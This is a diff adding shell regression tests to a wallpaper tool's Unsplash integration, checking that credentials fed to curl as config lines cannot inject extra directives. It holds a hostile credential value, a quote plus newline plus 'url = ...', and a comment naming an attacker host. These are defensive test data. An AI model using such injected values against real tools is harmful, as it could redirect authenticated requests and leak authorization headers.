@@ -300,6 +300,69 @@ if grep '^KEYTO ' "$evildllog" | grep -qv '^KEYTO https://api\.unsplash\.com/'; 
 else pass "non-api download_location never receives the key"; fi
 unset STUB_DL
 
+# --- a credential can never inject a curl CONFIG DIRECTIVE ------------------
+# Keeping credentials off argv is only half the problem. They reach curl as
+# `-K -` config lines, and that config is a GRAMMAR: `directive = "value"`.
+# A quote inside a value ENDS it, and a newline then begins a NEW directive —
+# so a credential carrying `"\nurl = "http://attacker/` makes curl perform a
+# SECOND transfer to a target the tool never chose, carrying the Authorization
+# header with it. Every credential SOURCE is gated at the point it enters the
+# grammar, so a hostile value must die with ZERO transfers.
+#
+# The stub counts transfers instead of answering: a passing run is one that
+# never invokes it at all.
+credbin="$fixture/credbin"
+mkdir -p "$credbin"
+cat >"$credbin/curl" <<'EOS'
+#!/bin/sh
+# Counts invocations. Answers nothing: any call at all is a failed defence.
+printf 'TRANSFER %s\n' "$*" >>"${CURL_CALL_LOG:?}"
+exit 0
+EOS
+chmod +x "$credbin/curl"
+printf '#!/bin/sh\nexit 0\n' >"$credbin/open"; chmod +x "$credbin/open"
+credlog="$fixture/curl-cred.log"
+# A quoted value plus a newline plus a second directive — the exact shape.
+hostile_cred='goodtoken"
+url = "http://127.0.0.1:9/injected-second-transfer'
+cred_run() { # $1 label, $2.. env assignments then -- then argv
+    local label="$1"; shift
+    local envs=() ; while [ "$1" != "--" ]; do envs+=("$1"); shift; done; shift
+    : >"$credlog"
+    local out
+    out=$(env "${envs[@]}" CURL_CALL_LOG="$credlog" PATH="$credbin:$PATH" \
+        THEME_WALLPAPER_DIR="$lib" THEME_NO_APPLY=1 TMPDIR="$fixture/tmpdir" \
+        bash "$THEME" "$@" 2>&1)
+    local n; n=$(wc -l <"$credlog" | tr -d ' ')
+    if [ "$n" = 0 ]; then pass "$label reaches curl zero times"
+    else fail "$label produced $n curl transfer(s) — config-directive injection"; fi
+    case "$out" in
+    *"cannot occur in an Unsplash credential"*) pass "$label is refused by the credential grammar" ;;
+    *) fail "$label was not refused by the credential grammar" ;;
+    esac
+}
+cred_run "a quote+newline account token" \
+    "UNSPLASH_USER_TOKEN=$hostile_cred" UNSPLASH_ACCESS_KEY=validkey -- unsplash random
+cred_run "a quote+newline access key" \
+    UNSPLASH_USER_TOKEN= "UNSPLASH_ACCESS_KEY=$hostile_cred" -- unsplash random
+cred_run "a quote+newline token on status" \
+    "UNSPLASH_USER_TOKEN=$hostile_cred" UNSPLASH_ACCESS_KEY=validkey -- unsplash status
+cred_run "a quote+newline key on the auth exchange" \
+    "UNSPLASH_ACCESS_KEY=$hostile_cred" UNSPLASH_SECRET_KEY=sec -- unsplash auth
+cred_run "a quote+newline app secret" \
+    UNSPLASH_ACCESS_KEY=validkey "UNSPLASH_SECRET_KEY=$hostile_cred" -- unsplash auth
+# The gate must not swallow credentials that are merely unusual: every
+# character below occurs in real Unsplash keys and tokens. A refusal here
+# would make the control useless in practice, which is how such gates get
+# removed later.
+: >"$credlog"
+env UNSPLASH_USER_TOKEN='abc-DEF_123.tok~x+y/z=' UNSPLASH_ACCESS_KEY=validkey \
+    CURL_CALL_LOG="$credlog" PATH="$credbin:$PATH" THEME_WALLPAPER_DIR="$lib" \
+    THEME_NO_APPLY=1 TMPDIR="$fixture/tmpdir" bash "$THEME" unsplash random >/dev/null 2>&1
+if [ "$(wc -l <"$credlog" | tr -d ' ')" -ge 1 ]; then
+    pass "a legitimate token is not refused by the grammar"
+else fail "the credential grammar refused a legitimate token"; fi
+
 # --- `theme list` colorscheme column: reports the cache, never guesses ------
 # The column claims "the scheme THIS wallpaper derived", and pywal's cache
 # FILENAME cannot back that claim: it is the wallpaper path with '/' and '.'
@@ -430,6 +493,7 @@ exists "nothing written through the symlink"   no "$out/redirected.png"
 exists "download landed inside the library"    yes "$lib/hijacked-2.png"
 if [ -L "$lib/hijacked.png" ]; then pass "the hijacking symlink is left alone"
 else fail "the hijacking symlink was replaced or removed"; fi
+
 # A symlink to an IDENTICAL in-library file is still not that file. `-f`
 # follows symlinks, so without the `-L` arm the alias hashes equal and gets
 # adopted as the saved wallpaper — the library would then hold a wallpaper
